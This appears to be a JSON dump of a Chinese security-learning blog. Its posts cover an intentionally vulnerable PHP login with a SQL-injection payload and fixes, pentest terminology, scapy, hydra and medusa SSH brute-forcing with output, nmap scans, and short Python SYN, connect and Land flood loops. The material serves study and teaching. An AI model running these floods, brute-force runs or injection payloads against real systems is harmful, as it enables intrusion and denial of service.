$conn-&gt;prepare($new_sql); $stmt-&gt;bind_param(&quot;s&quot;,$username); $stmt-&gt;execute(); &#125; else&#123; echo &quot;login-fail&quot;; echo &quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;; // 失败failcount加1 记录当前时间 $new_sql = &quot;update user_account set failcount = failcount+1,lasttime=now() where username= ?&quot;; $stmt = $conn-&gt;prepare($new_sql); $stmt-&gt;bind_param(&quot;s&quot;,$username); $stmt-&gt;execute(); &#125; &#125; else&#123; echo &quot;login-fail&quot;; echo &quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;; // 失败failcount加1 记录当前时间 $new_sql = &quot;update user_account set failcount = failcount+1,lasttime=now() where username= ?&quot;; $stmt = $conn-&gt;prepare($new_sql); $stmt-&gt;bind_param(&quot;s&quot;,$username); $stmt-&gt;execute(); &#125;?&gt;","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"登录漏洞-实现原理","slug":"Web渗透/登录漏洞-实现原理","date":"2023-11-08T16:00:00.000Z","updated":"2024-03-12T10:10:17.593Z","comments":true,"path":"2023/11/09/Web渗透/登录漏洞-实现原理/","link":"","permalink":"http://zwjsfdbb.top/2023/11/09/Web%E6%B8%97%E9%80%8F/%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"1、环境配置 xmapp +centos7 登录代码： login.html 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;登录&lt;/h2&gt; &lt;!-- form提交方式 --&gt; &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label for=&quot;captcha&quot;&gt;验证码:&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;captcha&quot; name=&quot;captcha&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; login.php 1234567891011121314151617181920212223242526272829303132&lt;?php $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $captcha = $_POST[&#x27;captcha&#x27;]; if ($captcha !==&#x27;0000&#x27;) &#123; die(&#x27;vcode-error&#x27;); &#125; $conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;123456&#x27;,&#x27;learn&#x27;); if (!$conn) &#123; die(&quot;连接失败: &quot; . mysqli_connect_error()); &#125; mysqli_query($conn,&quot;set names utf8&quot;); $sql = &quot;select * from user_account where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;; $result = mysqli_query($conn,$sql); if (mysqli_num_rows($result) == 1) &#123; echo &quot;login-success&quot;; echo &quot;&lt;script&gt;location.href=&#x27;hello.php&#x27;&lt;/script&gt;&quot;; &#125; else&#123; echo &quot;login-fail&quot;; echo &quot;&lt;script&gt;location.href=&#x27;login.php&#x27;&lt;/script&gt;&quot;; &#125;?&gt; 2、测试sql 注入 在登录页面输入单引号作为用户名，密码123456，验证码0000，响应如下","text":"1、环境配置 xmapp +centos7 登录代码： login.html 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;登录&lt;/h2&gt; &lt;!-- form提交方式 --&gt; &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label for=&quot;captcha&quot;&gt;验证码:&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;captcha&quot; name=&quot;captcha&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; login.php 1234567891011121314151617181920212223242526272829303132&lt;?php $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $captcha = $_POST[&#x27;captcha&#x27;]; if ($captcha !==&#x27;0000&#x27;) &#123; die(&#x27;vcode-error&#x27;); &#125; $conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;123456&#x27;,&#x27;learn&#x27;); if (!$conn) &#123; die(&quot;连接失败: &quot; . mysqli_connect_error()); &#125; mysqli_query($conn,&quot;set names utf8&quot;); $sql = &quot;select * from user_account where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;; $result = mysqli_query($conn,$sql); if (mysqli_num_rows($result) == 1) &#123; echo &quot;login-success&quot;; echo &quot;&lt;script&gt;location.href=&#x27;hello.php&#x27;&lt;/script&gt;&quot;; &#125; else&#123; echo &quot;login-fail&quot;; echo &quot;&lt;script&gt;location.href=&#x27;login.php&#x27;&lt;/script&gt;&quot;; &#125;?&gt; 2、测试sql 注入 在登录页面输入单引号作为用户名，密码123456，验证码0000，响应如下 示例的漏洞： （1）单引号可以成功引起SQL语句报错，说明后台没有对单引号进行处理，可能存在注入点 12345678910111213示例攻击payloadusername=x&#x27; or userid=1#&#x27; username=x%27+or+userid%3D1%23%27&amp;password=admin123&amp;captcha=0000sql 语句select * from user_account where username=&#x27;x&#x27; or userid=1#&#x27; &#x27; and password=&#x27;admin123&#x27;;真实执行的是 select * from user_account where username=&#x27;x&#x27; or userid=1 （#） 注释了后面的语句 （2）在报错里面暴露了敏感信息，当前代码的路径 &#x2F;opt&#x2F;lamp&#x2F;htdocs&#x2F;learn&#x2F;login.php 注入类的核心： （1）拼接为有效的语句或者代码 （2）确保完成了闭合，并且可以改变原本的执行逻辑 3、总结 上述代码总共有6个漏洞 1234561、hello.php 页面谁都可以访问，未进行登录判断(中)2、在登录框输入&#x27;作为用户名，会暴露login.php的完整路径，泄露敏感信息(低)3、保存用户数信息的数据库中，密码明文保存（中）4、登录页可以sql注入，轻易实现登录（高）5、login.php使用了万能验证码（中）6、登录功能可以被爆破，没有爆破防护（中） 4、解决以上问题 问题1解决方案： 12345678910111213141516171819202122232425262728新增页面common.php中&lt;?php session_start();?&gt;login.php 修改如下include &quot;common.php&quot;;if (mysqli_num_rows($result) == 1) &#123; echo &quot;login-success&quot;; $_SESSION[&#x27;username&#x27;] = $username; $_SESSION[&#x27;islogin&#x27;] = &#x27;true&#x27;;&#125; hello.php 修改如下&lt;?phpinclude &quot;common.php&quot;;if (isset($_SESSION[&#x27;islogin&#x27;]) and $_SESSION[&#x27;islogin&#x27;] == &#x27;true&#x27;)&#123; echo &quot;hello world&quot;;&#125;else&#123; die(&quot;未登录，无法访问&quot;);&#125;?&gt; 问题2 解决办法： 123mysql_query 后新增 or die(&#x27;sql语句执行错误&#x27;); 问题3 解决办法 12user_account表中 password 必须是32位用户注册时，使用md5函数加密后保存。 问题4 解决办法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172SQL 注入防护1、逻辑层面用户名和密码的比对不要放在一起先比对用户名，查询是否数据库中是否有一条记录，存在再进行密码的比对 $sql = &quot;select * from user_account where username=&#x27;$username&#x27;&quot;; $result = mysqli_query($conn,$sql) or die(&#x27;sql语句执行错误&#x27;); if (mysqli_num_rows($result) == 1) &#123; $row = mysqli_fetch_assoc($result); // var_dump($row); if($password == $row[&#x27;password&#x27;]) &#123; echo &quot;login-success&quot;; echo &quot;&lt;script&gt;location.href=&#x27;hello.php&#x27;&lt;/script&gt;&quot;; $_SESSION[&#x27;username&#x27;] = $username; $_SESSION[&#x27;islogin&#x27;] = &#x27;true&#x27;; &#125; else&#123; echo &quot;login-fail&quot;; echo &quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;; &#125; &#125; else&#123; echo &quot;login-fail&quot;; echo &quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;; &#125;2、强制专业特殊符号如引号select * from user_account where username=&#x27;x&#x27; or userid=1#&#x27; &#x27; and password=&#x27;admin123&#x27;;使用addslashes函数转移后，就编成select * from user_account where username=&#x27;x\\&#x27; or userid=1#\\&#x27;&#x27; and password=&#x27;admin123&#x27;;3、Mysqli的预处理功能mysqli的预处理函数会转移引号等参数，避免大多数的SQL注入$sql = &quot;select userid,username,password from user_account where username= ?&quot;;$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param(&quot;s&quot;,$username);// 绑定结果参数$stmt-&gt;bind_result($userid,$username1,$password1);$stmt-&gt;execute();$stmt-&gt;store_result();if($stmt-&gt;num_rows == 1)&#123;$stmt-&gt;fetch();if($password == $password1)&#123;echo &quot;login-success&quot;;echo &quot;&lt;script&gt;location.href=&#x27;hello.php&#x27;&lt;/script&gt;&quot;;//登录成功后记录session变量$_SESSION[&#x27;username&#x27;] = $username;$_SESSION[&#x27;islogin&#x27;] = &#x27;true&#x27;;&#125;else&#123;echo &quot;login-fail&quot;;echo &quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;;&#125;&#125; 5、MYSQL 开启 执行日志 123456use mysql;set GLOBAL log_output = &#x27;TABLE&#x27;;SET GLOBAL general_log = &#x27;ON&#x27;;show VARIABLES like &#x27;general_log&#x27;;","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"渗透测试基础","slug":"Web渗透/渗透测试基础","date":"2023-11-05T16:00:00.000Z","updated":"2024-03-12T10:12:44.084Z","comments":true,"path":"2023/11/06/Web渗透/渗透测试基础/","link":"","permalink":"http://zwjsfdbb.top/2023/11/06/Web%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/","excerpt":"一、渗透测试基础 1、概念 渗透测试是一种模拟恶意攻击者的技术和方法，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试和评估方法。 2、类型 黑盒测试、白盒测试、灰盒测试 3、生命周期 漏洞挖掘-&gt;0-day-&gt;1-day-&gt;N-day-&gt;修补 4、需要授权的场景 （1）为客户提供渗透测试服务 (2) 针对非客户的自有系统，建议获取授权后测试","text":"一、渗透测试基础 1、概念 渗透测试是一种模拟恶意攻击者的技术和方法，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试和评估方法。 2、类型 黑盒测试、白盒测试、灰盒测试 3、生命周期 漏洞挖掘-&gt;0-day-&gt;1-day-&gt;N-day-&gt;修补 4、需要授权的场景 （1）为客户提供渗透测试服务 (2) 针对非客户的自有系统，建议获取授权后测试 （3）保留任何可以授权的证据 5、不需要授权的场景 （1）针对开源的产品系统，如Linux、Apache、Tomcat、MariaDB、Redis等 （2）针对自己闭源的产品型软件，如Windows 、QQ等 (3) 众测：厂商委托安全平台，如补天、漏洞盒子等 6、漏洞库 CVE https://cve.mitre.org/cve/search_cve_list.html CWE、https://cwe.mitre.org/data/definitions/1337.html OWASP https://owasp.org.www-project-top-ten CNVD https://www.cnvd.org.cn CNNVD https://cnnvd.org.cn 漏洞盒子 https://www.vulbox.com 补天 https://www.butian.net 7、渗透测试流程 前期交互-》情报收集-》汇总分析-》渗透攻击-》后渗透-》报告 8、渗透测试的主流工具 域名注册信息：Whois 在线网站，Nslookup 在线漏洞引擎：Fofa、 Shodan、zoomeyes.org 指纹识别: CMS识别工具 操作系统识别工具 端口扫描：Nmap、Masscan 网站路径扫描: 御剑、WWWSCAN 主机漏洞扫描: Nessus web应用漏洞扫描：AWVS Xray APPSCAN 抓包：Wireshark、科来 Sql注入： Sqlmap 集成攻击平台: msf、BP、Cobalt Strike 反编译工具：IDA、OD、Winhex shell连接工具：中国菜刀、蚁剑 系统hash破解： Pwdump、Shadow、LC5&#x2F;JOHN、www.objectctif-securite.ch 内网抓取hash： WCE、Mimikatz、Procdumo+Mimikatz、John、Getpass 公开exp： structs2 工具集、 JBoss反序列化工具 、Ms08-067 9、专业术语 webshell: 基于web开发语言（PHP Java Python C# go javascript） 制作的木马程序 payload: 有效载荷 肉鸡：攻击者控制的主机 POC ： Proof of Concept 概念验证，用于发现漏洞后编写程序进行漏洞验证，确认漏洞的存在 EXP: 漏洞利用 CC: 挑战黑洞 C2: Command &amp; control 命令控制服务器 FUZZ: 模糊测试，基于规则或者字典进行快速的测试，发现漏洞点 DDOS: 分布式拒绝服务攻击 横向移动、内网渗透：获取到内网某一个主机权限后，继续在局域网进行扫描等发现其他主机并入侵 社工：社会工程学（骗） 社工库：一些正规或者非正规渠道获取到的各种个人数据 WAF： Web应用防火墙 IDS：入侵检测系统，检测后预警 IPS：入侵防御系统、检测并防御 脆弱项：Weakness 可能存在风险 威胁：Threat 明确存在风险 攻击：Attack 直接利用了安全漏洞 漏洞：Vulnerability APT: Advanced Persistent Threat 提权：普通权限提升到系统权限等 越权：A有了B的权限 SEIM：安全管理平台，态势感知 系统 安全左移：安全提前到研发阶段（安全分析、安全设计、安全架构、安全编码、安全测试）","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"scapy 使用","slug":"编程/scapy使用","date":"2023-10-31T16:00:00.000Z","updated":"2024-03-12T11:12:59.903Z","comments":true,"path":"2023/11/01/编程/scapy使用/","link":"","permalink":"http://zwjsfdbb.top/2023/11/01/%E7%BC%96%E7%A8%8B/scapy%E4%BD%BF%E7%94%A8/","excerpt":"1、scapy 安装 pip install scapy 2、基本功能 监听流量，分析流量，编辑流量数据包（数据链路层，网络层，传输层） 3、基本使用 shell使用 1234567891011121314151617181920212223242526命令行下直接执行scapy# 显示接口信息 show_interfaces() # 抓包 pkg= sniff(count=100,filter=&quot;icmp&quot;) pkg.summary() # 发送数据 5个数据包，间隔为1 payload=&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot; send(IP(dst=&quot;192.168.101.6&quot;)/ICMP()/&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;) #接收数据包 pkg = sr1(IP(dst=&quot;192.168.101.6&quot;)/ICMP()/&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;) # 发送/接收arp 数据包 pkg = sr1(ARP(psrc=&#x27;192.168.101.8&#x27;,pdst=&quot;192.168.101.6&quot;)) # 显示协议字段 &gt;&gt;&gt; ARP().show() ###[ ARP ]### hwtype = Ethernet (10Mb) ptype = IPv4 hwlen = None plen = None op = who-has hwsrc = 4c:ed:fb:94:b4:25 psrc = 192.168.101.8 hwdst = 00:00:00:00:00:00 pdst = 0.0.0.0 python 等待更新","text":"1、scapy 安装 pip install scapy 2、基本功能 监听流量，分析流量，编辑流量数据包（数据链路层，网络层，传输层） 3、基本使用 shell使用 1234567891011121314151617181920212223242526命令行下直接执行scapy# 显示接口信息 show_interfaces() # 抓包 pkg= sniff(count=100,filter=&quot;icmp&quot;) pkg.summary() # 发送数据 5个数据包，间隔为1 payload=&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot; send(IP(dst=&quot;192.168.101.6&quot;)/ICMP()/&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;) #接收数据包 pkg = sr1(IP(dst=&quot;192.168.101.6&quot;)/ICMP()/&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;) # 发送/接收arp 数据包 pkg = sr1(ARP(psrc=&#x27;192.168.101.8&#x27;,pdst=&quot;192.168.101.6&quot;)) # 显示协议字段 &gt;&gt;&gt; ARP().show() ###[ ARP ]### hwtype = Ethernet (10Mb) ptype = IPv4 hwlen = None plen = None op = who-has hwsrc = 4c:ed:fb:94:b4:25 psrc = 192.168.101.8 hwdst = 00:00:00:00:00:00 pdst = 0.0.0.0 python 等待更新","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"工具篇","slug":"黑客工具/工具篇","date":"2023-10-30T16:00:00.000Z","updated":"2024-03-12T10:43:12.598Z","comments":true,"path":"2023/10/31/黑客工具/工具篇/","link":"","permalink":"http://zwjsfdbb.top/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/","excerpt":"1、爆破工具 hydra 1234567891011121314151617Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]Options: -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -C FILE colon separated &quot;login:pass&quot; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, &#x27;:&#x27; to specify port -t TASKS run TASKS number of connects in parallel per target (default: 16) -U service module usage details -m OPT options specific for a module, see -U output for information -h more command line options (COMPLETE HELP) server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help)Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp 示例： 1234567891011└─$ hydra -l cleint -P ./password.txt 192.168.101.7 ssh Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-31 10:42:10[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task[DATA] attacking ssh://192.168.101.7:22/[22][ssh] host: 192.168.101.7 login: cleint password: qwe1231 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 10:42:12 medusa 1234567└─$ medusa -h 192.168.101.7 -u cleint -P ./password.txt -M ssh Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: 123456 (1 of 2 complete)ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: qwe123 (2 of 2 complete)ACCOUNT FOUND: [ssh] Host: 192.168.101.7 User: cleint Password: qwe123 [SUCCESS] 2、端口扫描工具 nmap 扫描操作系统 原理 ：Nmap维护一个nmap-os-db数据库，存储了上千种操作系统信息，简单一点来说,Nmap通过TCP&#x2F;IP协议栈的指纹信息来识别目标主机的操作系统信息，这主要是利用了RFC标准中，没有强制规范了TCP&#x2F;IP的某些实现,于是不同的系统中TCP&#x2F;IP的实现方案可能都有其特定的方式，这些细节上的差异，给nmap识别操作系统信息提供了方案，具体一点说,Nmap分别挑选一个close和open的端口，分别发送给一个经过精心设计的TCP&#x2F;UDP数据包，当然这个数据包也可能是ICMP数据包。然后根据收到返回报文,生成一份系统指纹。通过对比检测生成的指纹和nmap-os-db数据库中的指纹，来查找匹配的系统。最坏的情况下，没有办法匹配的时候,则用概率的形式枚举出所有可能的信息。","text":"1、爆破工具 hydra 1234567891011121314151617Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]Options: -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -C FILE colon separated &quot;login:pass&quot; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, &#x27;:&#x27; to specify port -t TASKS run TASKS number of connects in parallel per target (default: 16) -U service module usage details -m OPT options specific for a module, see -U output for information -h more command line options (COMPLETE HELP) server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help)Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp 示例： 1234567891011└─$ hydra -l cleint -P ./password.txt 192.168.101.7 ssh Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-31 10:42:10[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task[DATA] attacking ssh://192.168.101.7:22/[22][ssh] host: 192.168.101.7 login: cleint password: qwe1231 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 10:42:12 medusa 1234567└─$ medusa -h 192.168.101.7 -u cleint -P ./password.txt -M ssh Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: 123456 (1 of 2 complete)ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: qwe123 (2 of 2 complete)ACCOUNT FOUND: [ssh] Host: 192.168.101.7 User: cleint Password: qwe123 [SUCCESS] 2、端口扫描工具 nmap 扫描操作系统 原理 ：Nmap维护一个nmap-os-db数据库，存储了上千种操作系统信息，简单一点来说,Nmap通过TCP&#x2F;IP协议栈的指纹信息来识别目标主机的操作系统信息，这主要是利用了RFC标准中，没有强制规范了TCP&#x2F;IP的某些实现,于是不同的系统中TCP&#x2F;IP的实现方案可能都有其特定的方式，这些细节上的差异，给nmap识别操作系统信息提供了方案，具体一点说,Nmap分别挑选一个close和open的端口，分别发送给一个经过精心设计的TCP&#x2F;UDP数据包，当然这个数据包也可能是ICMP数据包。然后根据收到返回报文,生成一份系统指纹。通过对比检测生成的指纹和nmap-os-db数据库中的指纹，来查找匹配的系统。最坏的情况下，没有办法匹配的时候,则用概率的形式枚举出所有可能的信息。 1234567891011121314151617└─# nmap -O 192.168.101.10Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 09:57 EDTNmap scan report for 192.168.101.10 (192.168.101.10)Host is up (0.00090s latency).Not shown: 998 filtered portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAPRunning: Actiontec embedded, LinuxOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernelOS details: Actiontec MI424WR-GEN3I WAPOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 58.34 seconds 扫描IP地址 判断存活 基于ARP 123456789101112131415161718192021222324252627nmap -sn 192.168.101.1/24Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 10:04 EDTNmap scan report for 192.168.101.1 (192.168.101.1)Host is up (0.0024s latency).MAC Address: 68:77:24:36:8F:BC (Unknown)Nmap scan report for 192.168.101.2 (192.168.101.2)Host is up (0.0014s latency).MAC Address: 3C:06:A7:0C:63:B5 (Unknown)Nmap scan report for 192.168.101.4 (192.168.101.4)Host is up (0.043s latency).MAC Address: E0:BB:9E:4B:EF:D0 (Seiko Epson)Nmap scan report for 192.168.101.5 (192.168.101.5)Host is up (0.067s latency).MAC Address: 86:4A:E5:5B:64:C8 (Unknown)Nmap scan report for 192.168.101.6 (192.168.101.6)Host is up (0.048s latency).MAC Address: 34:7D:F6:24:3E:1B (Intel Corporate)Nmap scan report for 192.168.101.8 (192.168.101.8)Host is up (0.000054s latency).MAC Address: 4C:ED:FB:94:B4:25 (Asustek Computer)Nmap scan report for 192.168.101.10 (192.168.101.10)Host is up (0.00019s latency).MAC Address: 00:0C:29:C8:D9:ED (VMware)Nmap scan report for 192.168.101.7 (192.168.101.7)Host is up.Nmap done: 256 IP addresses (8 hosts up) scanned in 9.40 seconds 扫描端口 123456789101112131415161718基于三次握手 namp -sT IP基于SYN nmap -sS IP基于ACK nmap -sA IP不进行ping nmap -Pn IP扫描端口和版本 nmap -sV IP└─# nmap -sV 192.168.101.10 Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 10:14 EDTNmap scan report for 192.168.101.10 (192.168.101.10)Host is up (0.00033s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)80/tcp open http Apache httpd 2.4.56 ((Unix) OpenSSL/1.1.1t PHP/8.2.4 mod_perl/2.0.12 Perl/v5.34.1)3306/tcp closed mysqlMAC Address: 00:0C:29:C8:D9:ED (VMware)指定端口 nmap -p10-200, -p21,22 3、子域名扫描工具 python ping&#x2F;socket 1234567891011121314151617181920212223242526# 基于ping命令的子域名扫描def subdomain_ping(domain): with open(&#x27;dict.txt&#x27;, &#x27;r&#x27;) as f: datalines = f.readlines() for line in datalines: sub_domain = line.strip() + &#x27;.&#x27; + domain result = os.popen(f&quot;ping -n 1 -w 1000 &#123;sub_domain&#125;&quot;).read() if &#x27;TTL&#x27; in result or &quot;请求超时&quot; in result: print(f&quot;&#123;sub_domain&#125; 存在&quot;) if &#x27;找不到主机&#x27; in result: print(f&quot;&#123;sub_domain&#125; 不存在&quot;)# 基于socket库def subdomain_socket(domain): with open(&#x27;dict.txt&#x27;, &#x27;r&#x27;) as f: datalines = f.readlines() for line in datalines: try: sub_domain = line.strip() + &#x27;.&#x27; + domain ip = socket.gethostbyname(sub_domain) print(f&quot;&#123;sub_domain&#125; ip is &#123;ip&#125;&quot;) except: pass windows Layer 子域名 kali dnsenum 在线子域名扫描网站 4、后台扫描工具 御剑 扫描后台地址 5、web站点信息采集 kali whatweb whois信息 可通过whois 网站和python-whois 库 nslookup 可以用于确认是否使用CDN网络 fofa.info shodan 网络设备查找 （如附近的摄像头、工控设备、路由器、打印机等） 6、泛洪攻击 基于协议通信，完成大流量高并发操作，导致目标主机各类资源消耗过多而无法提供正常的服务。（MAC地址泛洪，ARP泛洪欺骗） （1）正常通信 （2）目标主机未配置很好的防护措施 socket 三次握手泛洪 1234567# tcp 三次握手泛洪def socket_flood(target_ip): while True: s = socket.socket() s.connect((target_ip, 80)) scapy半连接泛洪 12345# scapy 半连接泛洪def scapy_flood(target_ip): while True: pkg = IP(dst=target_ip) / TCP(dport=80, flags=&#x27;S&#x27;) send(pkg, verbose=False) TCP Land泛洪 123456# TCP Land 泛洪 (源IP和目的IP是一样的)def land_flood(target_ip): while True: pkg = IP(src=target_ip, dst=target_ip) / TCP(dport=80, flags=&#x27;S&#x27;) send(pkg, verbose=False) 